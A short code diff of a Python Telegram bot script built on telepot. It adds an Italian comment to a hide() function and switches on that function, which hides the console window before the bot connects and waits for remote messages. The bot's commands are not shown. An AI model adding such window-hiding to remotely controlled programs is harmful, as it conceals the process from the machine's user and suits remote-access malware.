@@ -9,7 +9,7 @@ from telepot.loop import MessageLoop
 import private
 import app
 
-def hide():
+def hide(): # nasconde il terminale sullo schermo
     hide =  GetForegroundWindow()
     ShowWindow(hide, SW_HIDE)
 
@@ -119,7 +119,7 @@ def handle(msg): #what to do if new message is received
     else:
         bot.sendMessage(chat_id(), "I don't understand...")
 
-# hide()
+hide()
 sleep(10)
 wait_for_internet_connection()
 bot = telepot.Bot(bot_token())
